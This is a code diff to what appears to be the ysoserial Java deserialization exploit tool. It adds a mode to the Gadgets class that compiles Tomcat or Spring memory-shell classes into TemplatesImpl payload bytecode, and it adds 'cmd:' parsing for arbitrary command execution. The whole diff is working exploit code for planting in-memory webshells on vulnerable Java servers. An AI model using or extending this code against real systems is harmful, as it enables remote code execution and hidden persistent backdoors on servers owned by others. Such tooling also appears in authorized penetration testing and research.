@@ -16,6 +16,7 @@ import com.nqzero.permit.Permit;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
+import javassist.bytecode.ClassFile;
 
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
@@ -90,8 +91,17 @@ public class Gadgets {
     }
 
 
-    public static Object createTemplatesImpl ( final String command ) throws Exception {
-        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
+    public static Object createTemplatesImpl ( final String tmplType ) throws Exception {
+        String[] tmplArgs = tmplType.split(":", 2);
+
+        String command = tmplType;
+        if (tmplArgs.length == 2 && tmplArgs[0].equals("memshell")) {
+            return createTemplatesImplInjectMemshell(tmplArgs[1]);
+        } else if (tmplArgs.length == 2 && tmplArgs[0].equals("cmd")) {
+            command = tmplArgs[1];
+        }
+
+        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
             return createTemplatesImpl(
                 command,
                 Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
@@ -122,6 +132,7 @@ public class Gadgets {
         clazz.setName("ysoserial.Pwner" + System.nanoTime());
         CtClass superC = pool.get(abstTranslet.getName());
         clazz.setSuperclass(superC);
+        clazz.getClassFile().setMajorVersion(ClassFile.JAVA_6);
 
         final byte[] classBytes = clazz.toBytecode();
 
@@ -136,6 +147,36 @@ public class Gadgets {
         return templates;
     }
 
+    public static <T> T createTemplatesImplInjectMemshell (String memshellName) throws Exception {
+        return createTemplatesImplInjectMemshell(memshellName, 6);
+    }
+
+    public static <T> T createTemplatesImplInjectMemshell (String memshellName, int javaVersion) throws Exception {
+        final T templates = (T) TemplatesImpl.class.newInstance();
+
+        if (memshellName.indexOf(".") == -1) {
+            String memshellPackage = "ysoserial.bullet.tmpl.memshell.";
+            if (memshellName.startsWith("Tomcat")) {
+                memshellName = memshellPackage + "tomcat." + memshellName;
+            } else if (memshellName.startsWith("Spring")) {
+                memshellName = memshellPackage + "spring." + memshellName;
+            }
+        }
+
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass = pool.get(memshellName);
+        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+        ctClass.getClassFile().setMajorVersion(ClassFile.JAVA_1 + javaVersion - 1);
+        byte[] classBytes = ctClass.toBytecode();
+
+        // inject class bytes into instance
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {classBytes});
+
+        // required to make TemplatesImpl happy
+        Reflections.setFieldValue(templates, "_name", "a");
+        Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
+        return templates;
+    }
 
     public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
             IllegalAccessException, InvocationTargetException {
